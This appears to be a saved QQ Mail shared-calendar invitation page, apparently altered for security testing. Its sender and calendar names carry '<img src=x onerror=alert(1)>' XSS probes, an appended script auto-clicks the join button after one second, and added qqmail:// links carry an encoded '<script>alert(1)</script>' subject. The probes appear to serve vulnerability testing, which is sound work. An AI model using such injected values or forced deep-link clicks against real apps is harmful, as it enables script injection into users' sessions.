
<!DOCTYPE html><html data="qqmailCard"><head><meta name="qqmail-navbartintcolor" content="qqmail-navbartintcolor-dark">    <meta http-equiv="Content-Type" content="text/html; charset=gb18030"/>    <meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">    <title>&quot;&lt;img&nbsp;src=x&nbsp;onerror=alert(1)&gt;向你共享了日历</title>    <style>        html,body {            margin: 0;            padding: 0;            font-family:'PingFang SC','lucida Grande',Verdana,'Microsoft YaHei';        }        html,body,.shared {            height: 100%;        }        .shared_inner {            width: 87%;            margin: 0 auto;            overflow :hidden;        }        .shared_head {            margin-top: 60px;            border: 1px solid #E0E0E4;            border-radius: 6px;            text-align: center;            box-shadow: 0 4px 10px 0 rgba(0,0,0,0.08);        }        .shared_head_inner {            width: 90%;            margin: auto;            padding: 16px 0 25px;        }        .shared_head_avatar {            width: 40px;            height: 40px;            display: block;            border-radius: 50%;            margin: 0 auto 12px;        }        .shared_head_des {            font-size: 14px;            color: #898989;            padding-bottom: 16px;            border-bottom: 1px solid #E9E9E9;            margin-bottom: 22px;        }        .shared_head_calendarName {            font-size: 20px;            color: #000000;            overflow: hidden;            text-overflow: ellipsis;            white-space: nowrap;        }        .shared_btn {            height: 44px;            line-height: 44px;            background-color: #4890e3;            color: #FFFFFF;            border-radius: 5px;            text-align: center;            margin-top: 30px;        }        .shared_des {            color: #ADADAD;            font-size: 14px;            margin-top: 12px;            text-align: center;        }        .shared_outdate {            color: #E64C52;            margin-top: 56px;            text-align: center;        }        @media screen and (-webkit-min-device-pixel-ratio:2){            .shared_head_des,.shared_head{                position:relative;                border: none;                border-radius: 0;                box-shadow:none;            }            .shared_head_des:before, .shared_head:before{                content:"";                width:200%;                height:200%;                box-sizing:border-box;                position:absolute;                top:0;                left:0;                -webkit-transform: scale(0.5);                -webkit-transform-origin: 0 0;                pointer-events:none;            }            .shared_head:before {                border: 1px solid #E0E0E4;                border-radius: 6px;                box-shadow:0 4px 10px 0 rgba(0,0,0,0.08);            }            .shared_head_des:before {                border-bottom: 1px solid #E9E9E9;            }        }        @media screen and (-webkit-min-device-pixel-ratio:3){            .shared_head:before,.shared_head_des:before{                width:300%;                height:300%;                -webkit-transform: scale(0.3333);            }        }    </style><style>.greetingCard_mask{position:fixed;top:0;right:0;bottom:0;left:0;z-index:99;background:rgba(0,0,0,.4);display:none}.greetingCard_mask_Show{display:block}.greetingCard_alert{position:fixed;left:-9999px;top:50%;z-index:100;width:72%;border-radius:13px;text-align:center;background:#fff;overflow:hidden;opacity:0;transition-property:transform,opacity;transition-timing-function:cubic-bezier(.23,1,.32,1);transform:translate(-50%,-50%) scale3d(.6,.6,1);-webkit-transform:translate(-50%,-50%) scale3d(.6,.6,1)}.greetingCard_alert_cnt{padding:38px 17px}.greetingCard_alert_cnt_title{font-size:34px;line-height:44px;margin-bottom:16px;color:#222224}.greetingCard_alert_cnt_text{font-size:16px;line-height:1.5em;color:#000000}.greetingCard_alert_foot{border-style:solid;border-color:#CCCCCE;border-width:1px 0 0;border-radius:0;font-size:17px}.greetingCard_alert_foot_btn{float:left;height:44px;width:50%;line-height:44px;color:#2B85D0;text-decoration: none;}.greetingCard_alert_foot_btn:active{background-color:#d1e7fc;text-decoration: none;}.greetingCard_alert_foot_btn_Cancel{box-sizing:border-box;border-style:solid;border-color:#dddddf;border-width:0 1px 0 0;border-radius:0}.greetingCard_alert_foot_btn_Del{background-color:#fed8d8;color:#FA3A3A}.qmail-footer,.qmail-footer-item{line-height:50px;background-color:#FAFAFA}.greetingCard_alert_Show{left:50%;opacity:1;transition-duration:.4s;transform:translate(-50%,-50%);-webkit-transform:translate(-50%,-50%)}.greetingCard_alert_Hide{opacity:0;transition-duration:.3s}.qmailhide{display:none!important}.qmail-footer{height:50px;font-size:16px;text-align:center;box-sizing:border-box;display:flex;display:-webkit-flex;position:fixed;bottom:0;width:100%;z-index:9999;border-top:1px solid #B0B0B0;opacity:.9}@media screen and (-webkit-min-device-pixel-ratio:2){.qmail-footer{border:none}.qmail-footer:before{content:"";width:200%;height:200%;box-sizing:border-box;position:absolute;top:0;left:0;border-top:1px solid #B0B0B0;-webkit-transform:scale(.5);-webkit-transform-origin:0 0;pointer-events:none;z-index:1}}@media screen and (-webkit-min-device-pixel-ratio:3){.qmail-footer:before{width:300%;height:300%;-webkit-transform:scale(.3333)}}.qmail-footer-item{color:#4C4C4C;height:50px;text-decoration:none;flex:1;webkit-flex:1}.qmail-footer-item:first-child{border:none}@media screen and (-webkit-min-device-pixel-ratio:2){.qmail-footer-item{position:relative;border:none}.qmail-footer-item:before{content:"";width:200%;height:200%;box-sizing:border-box;position:absolute;top:0;left:0;border-left:1px solid #B0B0B0;-webkit-transform:scale(.5);-webkit-transform-origin:0 0;pointer-events:none}.qmail-footer-item:first-child:before{border:none}}@media screen and (-webkit-min-device-pixel-ratio:3){.qmail-footer-item:before{width:300%;height:300%;-webkit-transform:scale(.3333)}}a.qmail-footer-item:active{background-color:#ededed}.qmail-guide-share{width:100%;height:100%;opacity:.6;background-color:#000;position:absolute;top:0;z-index:10}.qmail-guide-share-img{position:absolute;right:15px;top:15px;width:237px;height:204px}.qmail-guide-share-content{position:absolute;top:140px;right:135px;color:#fff;font-size:14px}</style><script>

</script></head><body>    <div class="shared">        <div class="shared_inner">            <div class="shared_head">                <div class="shared_head_inner">        
            <img src="https://mail.qq.com/cgi-bin/getqqicon?u=-1697674853" alt="" class="shared_head_avatar">                    <div class="shared_head_des">&quot;&lt;img&nbsp;src=x&nbsp;onerror=alert(1)&gt;向你共享了日历</div>                    <div class="shared_head_calendarName">&lt;img/src=x&nbsp;onerror=alert(1)&gt;</div>                </div>            </div>                            <div class="shared_btn" id="a_joinBar">加入日历</div>                <div class="shared_des">加入后，可查看此共享日历。24小时内加入有效。</div>                    </div>    </div><div class="greetingCard_mask" id="div_alert_mask"></div><div class="greetingCard_alert"  id="div_alert_content">    <div class="greetingCard_alert_cnt">        <!-- <div class="greetingCard_alert_cnt_title">提示</div> -->        <div class="greetingCard_alert_cnt_text" id="greetingCard_alert_cnt_text">发送贺卡需要安装QQ邮箱，现在下载？</div>    </div>    <div class="greetingCard_alert_foot">        <a id="a_alert_cancel" ontouchstart="" href="javascript:;" class="greetingCard_alert_foot_btn greetingCard_alert_foot_btn_Cancel">取消</a>        <a id="a_alert_down" ontouchstart="" href="javascript:;" class="greetingCard_alert_foot_btn greetingCard_alert_foot_btn_Confirm">确定</a>        <!-- 删除按钮 -->        <!-- <a ontouchstart="" href="javascript:;"  class="greetingCard_alert_foot_btn greetingCard_alert_foot_btn_Del">删除</a> -->    </div></div><script>
var sender = {}, share = {}, title="", isPreview="0", replyUrl = "", token = "", cardid = "", CARDNAME = "", shareUrl = "";

    title = "\x22\x3cimg src=x onerror=alert(1)\x3e向你共享了日历";
    share = {
        icon:"https://rescdn.qqmail.com/zh_CN/htmledition/images/webp/sharedCalendar/mailbox_calendar2f88a1.png",
        desc:"接受共享后，可查看对方日历",
        url : ""
    };

var token_code = "QAACxAACwAABpAABeF23rwCf4wCwfgBpEgBeABAk";

</script><script>
var WEIXIN = "weixin", QQ = "qq", WEB = "web", MAILAPP = "mailapp", ENV;

function getEnv(){
  if(ENV) return ENV;
  var ua = window.navigator.userAgent.toLowerCase();
  if(/micromessenger(\/[\d\.]+)*/i.test(ua)){
      ENV = WEIXIN;
  }else if(/qq\/(\/[\d\.]+)*/i.test(ua)){
      ENV = QQ;
  }else if(/mailapp/i.test(ua)){
      ENV = MAILAPP;
  }else{
      ENV = WEB;
  }
  return ENV;
};

function createFunc(flag){
  return function(){
    return flag === getEnv();
  }
};

var isQQ = createFunc(QQ),
    isWeiXin = createFunc(WEIXIN),
    isWeb = createFunc(WEB),
    isMailApp = createFunc(MAILAPP),
    isInMailApp = (isMailApp() || isPreview == "1" || location.hash == "#noplaybtn"),
    UAinH5 = navigator.userAgent,
    isIOS = !!UAinH5.match(/\(i[^;]+;( U;)? CPU.+Mac OS X/),
    isAndroid = !!UAinH5.match(/Android|Adr/i);;

var CARD_QQMAIL_APP_URL = "qqmail://greetingcard?action=main&catagory=3";
var CARD_QQMAIL_SEND_PLATFORM = "http://qumas.mail.qq.com/cgi-bin/uma_show_card_list?cardid="+encodeURIComponent(cardid);

function Emitter(){
    this._events = [];
  }

Emitter.prototype = 
{
    on: function (event, listener)
    {
        this._events[event] = this._events[event] || [];
        this._events[event].push(listener);

        return this;
    },
    off: function (event, listener)
    {
        this._events[event].splice(this._events[event].indexOf(listener), 1);
        return this;
    },
    emit: function (event)
    {
        var self = this;
        for(var i=0,len=self._events[event].length;i<len;i++){
          (function(val){
            val.apply(self);
          })(self._events[event][i]);
        };

        return self;
    }
};

function noop(){}

function qmailAjax(url, options){
    var xhr = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP"),
        type = options && options.type || "GET",
        data = options && options.data || "",
        dataType = options && options.dataType,
        success = options && options.success || noop,
        complete = options && options.complete || noop,
        error = options && options.error || noop;
    xhr.onreadystatechange = function()
    {
        if (xhr.readyState == 4) {
            if (xhr.status == 200)
            {
                try
                {
                    var result = xhr.responseText;
                    try {
                        if (dataType === 'json') result = JSON.parse(result);
                    } catch (e) {}
                    success(result, xhr);
                    complete(result);
                }
                catch(e){}
            }else{
                error(xhr.statusText || null, xhr);
                complete();
            }
        }
    }

    xhr.open(type, url, true);
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

    if (type === 'GET')
    {
        xhr.send();
    } else
    {
        xhr.send(data);
    }
}

function S(domId){
  return document.getElementById(domId);
}

function css(dom, cssText){
  dom.style.cssText = cssText;
}

function show(dom, showFlag){
  var displayCss = (showFlag ? "block" : "none");
  dom && dom.style && (dom.style.display = displayCss);
}

function loadJS(url, callback){
    var doc = window.document,
        script = doc.createElement("script");
    script.src = url;
    script.onload = callback;
    doc.body.appendChild(script);
}

function fastClick(dom, listener){
    var fastClickEventName = (("ontouchend" in window)&& !isAndroid && !isQQ()) ? "touchend" : "click";

    dom.addEventListener(fastClickEventName,function(event){
        event.preventDefault();
        listener(event);
    });
}

//========1.3 字符、正则处理========
/**
 * 去掉首尾多余的空格
 * @param {String} _asStr
 * @return {String}
 */
function trim(_asStr)
{
    return (_asStr && _asStr.replace ? _asStr : "").replace(/(^\s*)|(\s*$)/g, "");
}
/**
 * 设置对象样式
 * @param {Object} _aoDomObj
 * @param {String} _asClassName
 * @return {Object}
 */
function setClass(_aoDomObj, _asClassName)
{
    if (_aoDomObj && typeof(_asClassName) != "undefined" && _aoDomObj.className != _asClassName)
    {
        _aoDomObj.className = _asClassName;
    }
    return _aoDomObj;
}

/**
 * 添加样式
 * @param {Object} _aoDomObj
 * @param {String} _asClassName
 * @return {Object}
 */
function addClass(_aoDomObj, _asClassName)
{
    if (_aoDomObj)
    {
        var _sClass = " " + _aoDomObj.className + " ";
        if (_sClass.indexOf(" " + _asClassName + " ") < 0)
        {
            _aoDomObj.className += _aoDomObj.className ? " " + _asClassName : _asClassName;
        }
    }
    return _aoDomObj;
};

/**
 * 移除样式
 * @param {Object} _aoDomObj
 * @param {String} _asClassName
 * @return {Object}
 */
function rmClass(_aoDomObj, _asClassName)
{
    if (_aoDomObj)
    {
        if (_asClassName)
        {
            var _sClass = " " + _aoDomObj.className + " ";
            _sClass = _sClass.replace(" " + _asClassName + " ", " ");
            _aoDomObj.className = trim(_sClass);
        }
        else
        {
            _aoDomObj.className = "";
        }
    }
    return _aoDomObj;
};

/**
 * 样式检测
 * @return {Boolean}
 */
function hasClass(_aoDomObj, _asClassName)
{
    return _aoDomObj && (" " + _aoDomObj.className + " ").indexOf(" " + _asClassName + " ") > -1;
};

function setOpacity(dom, alapa){
  dom && dom.style && (dom.style.opacity=alapa);
}

function TimerQueue(tasks, timeInterval){
  this.tasks = tasks || [];
  this.timeInterval = timeInterval || 1000;
}

function isArray(obj){
    return Object.prototype.toString.call(obj) === '[object Array]';
}

TimerQueue.prototype.run = function(){

  var self = this,
      innerTask,
      currentTask = function(){
        (innerTask=self.tasks.shift()) && innerTask();
        setTimeout(function(){
          self.run();
        }, self.timeInterval);
      }
  
  currentTask.apply();
}

TimerQueue.prototype.add = function(task){
    this.tasks.push(task);
}

function showSignatureOneByOne(doms, timeInterval){
    var timerQueue = new TimerQueue([], timeInterval || 1000);
    for(var i=0,len=doms.length; i<len; i++){
        (function(dom){
            timerQueue.add(
                function(){
                    setOpacity(dom, 1);
                }
            ); 
        })(doms[i]);
        
    }
    timerQueue.run();
}

var platform,appName;

function getPlatform(){
    if(platform) return platform;
    return (platform=(isIOS?"ios":(isAndroid?"android":"pc")));
}

function getAppName(){
    if(appName) return appName;
    return (appName=(isQQ() ? "qq" : (isWeiXin() ? "wx": ((isMailApp()||isPreview=="1") ? "mailapp" : "other"))));
}

function getToken(){
    return token;
}

function getCardId(){
    return cardid;
}

function getLogKey(stat){
    return [stat, getCardName(), getPlatform(), getCardId()].join("_");
}

function getCardName(){
    return CARDNAME;
}

function xlyReportKV(iosKey, androidKey, pcKey){
    logKV(getAppName()+"_access");
    if(isIOS){
        reportTiming(iosKey);
    }else if(isAndroid){
        reportTiming(androidKey);
    }else{
        pcKey && reportTiming(pcKey);
    }
}

function onLoadCommonInit(){
    if(isMailApp() || isPreview == "1"){
        addClass(document.body, "gc_MailApp");
    }
    var paltformClass;
    if(isIOS){
        paltformClass = "gc_iOS";
    }else if(isAndroid){
        paltformClass = "gc_Android";
    }
    paltformClass && addClass(document.body, paltformClass);
}

var OSSLOG_REPORT_URL = "http://qumas.mail.qq.com/cgi-bin/uma_stat_card",
    delayLogList = [];
function logKV(stat, sendMode){
    //预览统一不上报
    if(isPreview == "1"){
        return;
    }

    if(isArray(stat)){
        for(var i=0,len=stat.length; i<len; i++){
            stat[i] = getLogKey(stat[i]);
        }
    }else{
        stat = getLogKey(stat);
    }

    var sendMode = sendMode || "delay";

    if(sendMode === "delay"){
        delayLogList = delayLogList.concat(stat);
    }else{
        logKV._doReport([].concat(stat));
    }

    (!logKV._timer && delayLogList.length > 0 ) && (logKV._timer = setTimeout(function(){
        logKV._doReport(delayLogList);
        delayLogList = [];
    },1*1000));
}

logKV._doReport = function(stats){
    qmailAjax(OSSLOG_REPORT_URL, {
       type : "POST", 
       data : encodeURIComponent(JSON.stringify({token:getToken(), types:stats}))
    });
    
    logKV._timer && clearTimeout(logKV._timer);
    logKV._timer = undefined;
};

var packageInfo = {
        packageName: 'com.tencent.androidqqmail',
        packageUrl: 'qqmail://'
    };

var MQQJSBridge = {
  bridge : window.mqq,
  share : function(message, timeLine){
    this.bridge.data.setShareInfo({
      image_url : message.icon,
      share_url : message.url,
      desc : message.desc,
      title : message.title
    });
  },
  installState: function (appInfo, cb)
    {
        appInfo = (mqq.android ? appInfo.packageName : appInfo.packageUrl);

        this.bridge.app.isAppInstalled(appInfo, function (result)
        {
            cb(result);
        });
    }
}
var MailAppJSBridge = {
  bridge : window.qmailBridge,
  share : function(message, timeLine){
    this.bridge.moreOperation([{
            shareToWechatTimeLine: {
                imageUrl: timeLine.icon,
                url     : timeLine.url,
                abstract: timeLine.desc,
                title   : timeLine.title
            }
        }, {
            shareToWechatFriend: {
                imageUrl: message.icon,
                url     : message.url,
                abstract: message.desc,
                title   : message.title
            }
        }]);
  }
};

var WXJSBridge = {
  bridge : window.WeixinJSBridge,
  share : function(message, timeLine){
    var bridge = this.bridge;
    // 发送给朋友
    bridge.on("menu:share:appmessage",function(){
      bridge.invoke("sendAppMessage", {
        img_url: message.icon,
                link: message.url,
                desc: message.desc,
                title: message.title
      });
    });
    // 发送到朋友圈分享
    bridge.on("menu:share:timeline",function(){
      bridge.invoke("shareTimeline", {
        img_url: timeLine.icon,
                link: timeLine.url,
                desc: timeLine.desc,
                title: timeLine.title
      });
    })
  },
  installState: function (appInfo, cb)
    {
        this.bridge.invoke('getInstallState', appInfo, function (e)
        {
            cb(e && e.err_msg.indexOf('get_install_state:yes') > -1);
        });

        return this;
    } 
};


(function(){
  var JSBridge;
  var emitter = new Emitter();

  function loadjsBridge(){
    if(isQQ()){
      loadJS("https://open.mobile.qq.com/sdk/qqapi.js?_bid=152" , function(){
        if(window.mqq){
          MQQJSBridge.bridge = window.mqq;
          JSBridge = MQQJSBridge;
          emitter.emit("ready");
        }
      });
    }else if(isWeiXin()){
      window.document.addEventListener('WeixinJSBridgeReady', function()
      {
        WXJSBridge.bridge = WeixinJSBridge;
        JSBridge = WXJSBridge;
        emitter.emit("ready");
      }, false);
    }else if(isInMailApp){
      loadJS("https://rescdn.qqmail.com/zh_CN/htmledition/js/app_api.js" , function(){
        if(window.qmailBridge){
          MailAppJSBridge.bridge = window.qmailBridge;
          JSBridge = MailAppJSBridge;
          emitter.emit("ready");
        }
      });
    }else{
      emitter.emit("ready");
    }
  }

  function isMailAppInstalled(cb){
    if(isInMailApp){
      cb(true);
    }else if(JSBridge){
      JSBridge.installState(packageInfo, cb);
    }else{
      cb(false);
    }
  }

  window.JSBridgeInCard = {
    ready : function(callback){
      var self = this;
      emitter.on("ready", function(){
        self.JSBridge = JSBridge;
        callback.apply(self);
      });
      loadjsBridge();
    },
    isMailAppInstalled : isMailAppInstalled,
    emitter : emitter
  }
})();
;

function AlertConfirm(config){
    this.alertMaskDom = S("div_alert_mask"),
    this.alertContentDom = S("div_alert_content"),
    this.alerCancelBtn = S("a_alert_cancel"),
    this.alerDownBtn = S("a_alert_down");
    this.alertContentDescDom = S("greetingCard_alert_cnt_text");
    this.config = config;
}

AlertConfirm.prototype = {
  init : function(){
    var self = this;

    self.alerCancelBtn.innerHTML = self.config.cancelText || "取消";
    self.alerDownBtn.innerHTML = self.config.confirmText || "确定";
    self.alertContentDescDom.innerHTML = self.config.msg || "";


    fastClick(this.alerCancelBtn, function(){
      self.hide();
    });

    fastClick(this.alerDownBtn, function(){
      logKV("ckdownapp","realtime");
      window.location.href=(this.config && this.config.downLoadUrl || "http://app.mail.qq.com/cgi-bin/mailapp?latest=match&apv=card");
      self.hide();
    });

    self.show();
  },
  show : function(){
    addClass(this.alertMaskDom, "greetingCard_mask_Show");
    addClass(this.alertContentDom, "greetingCard_alert_Show");
  },
  hide : function(){
    rmClass(this.alertMaskDom, "greetingCard_mask_Show");
    rmClass(this.alertContentDom, "greetingCard_alert_Show");
  }
};

var alertConfirm, CARDNAME = "share";

    JSBridgeInCard.ready(function(){

      this.isMailAppInstalled(function(hasInstallMailApp){
        //初始化iwant按钮
        initJoinCalendarEvent(hasInstallMailApp, S("a_joinBar"));
      
      });

      this.JSBridge && (this.JSBridge.share({
        icon :share.icon,
        url : share.url || location.href,
        desc: share.desc,
        title:title
      },{
        icon :share.icon,
        url : share.url || location.href,
        desc: share.desc,
        title:title
      }));
    });


    var SHARE_CALENDAR_QQMAIL_APP_URL = (isIOS ? "qqmail://calendar_share?action=accept" : "qqmail://calendar_share?action=accept") 
        + "&code=" + token_code;
    function initJoinCalendarEvent(hasInstallMailApp, JoinCalendar){
      // if(isInMailApp){
      //       //从H5跳转到mailapp的加入日历
      // }else 
      if(JoinCalendar && (hasInstallMailApp || /wxwork/i.test(window.navigator.userAgent)) ){

        fastClick(JoinCalendar, function(e){
//从H5跳转到mailapp的加入日历
e.preventDefault();
// logKV(["ckplaybtn", "jumptoapp"], "realtime");
 
if(isWeiXin()&&WeixinJSBridge&&WeixinJSBridge.invoke){

                var wechatInfo = navigator.userAgent.match(/MicroMessenger\/([\d\.]+)/i) ;

                if(versionCompare(wechatInfo[1]||"0","6.5.6",{zeroExtend:true, lexicographical:true}) !== -1){
                   WeixinJSBridge.invoke('launchApplication', {"schemeUrl": SHARE_CALENDAR_QQMAIL_APP_URL}, function (e)
                    {
                        //cb(e && e.err_msg.indexOf('launchApplication:ok') > -1);
                    });
                }else{
                    location.href = SHARE_CALENDAR_QQMAIL_APP_URL;
                }
}else{
location.href = SHARE_CALENDAR_QQMAIL_APP_URL;
}

          
        });
        
      }else{

        JoinCalendar && (fastClick(JoinCalendar, function(){

          if(alertConfirm){
            alertConfirm.show();
          }else{
            (alertConfirm = new AlertConfirm({
                confirmText : "前往下载",
                msg : "需要下载QQ邮箱客户端，接受共享日历"
            })).init();
          }
        }));
      }
    }

    function versionCompare(v1, v2, options) 
    {
        var lexicographical = options && options.lexicographical,
            zeroExtend = options && options.zeroExtend,
            v1parts = v1.split('.'),
            v2parts = v2.split('.');

        // function isValidPart(x) {
        //     return (lexicographical ? /^\d+[A-Za-z]*/).test(x);
        // }

        // if (!v1parts.every(isValidPart) || !v2parts.every(isValidPart)) {
        //     return NaN;
        // }

        if (zeroExtend) {
            while (v1parts.length < v2parts.length) v1parts.push("0");
            while (v2parts.length < v1parts.length) v2parts.push("0");
        }

        // if (!lexicographical) {
        //     v1parts = v1parts.map(Number);
        //     v2parts = v2parts.map(Number);
        // }

        for (var i = 0; i < v1parts.length; ++i) {
            if (v2parts.length == i) {
                return 1;
            }

            if (v1parts[i] == v2parts[i]) {
                continue;
            }
            else if (+v1parts[i] > +v2parts[i]) {
                return 1;
            }
            else {
                return -1;
            }
        }

        if (v1parts.length != v2parts.length) {
            return -1;
        }

        return 0;
    }

</script>
<script type="text/javascript">
// 两秒后模拟点击
setTimeout(function() {
    // IE
    if(document.all) {
        document.getElementById("a_joinBar").click();
    }
    // 其它浏览器
    else {
        var e = document.createEvent("MouseEvents");
        e.initEvent("click", true, true);
        document.getElementById("a_joinBar").dispatchEvent(e);
    }
}, 1000);
</script>
  
<a href="qqmail://calendar?subject=%26lt%3Bscript%26gt%3Balert(1)%26lt%3B%2Fscript%26gt%3B&nick=&allday=0&recurrence=%E6%B0%B8%E4%B8%8D&s_t=1583928900&e_t=1583932500&notes=&event_t=&recur_desc=-1&r_type=&r_occurrences=&r_interval=&r_weekOfMonth=0&r_dayOfWeek=0&r_monthOfYear=0&r_dayOfMonth=0&r_until=&r_dayOfMonth=0&r_calendarType=0&r_isLeapMonth=&r_firstDayOfWeek=&location=&subject_real=&location_real=&notes_real=">click</a>  
<a href="qqmail://calendar?action=accept_share_event&surl=">aaaaa</a>
            </body></html>

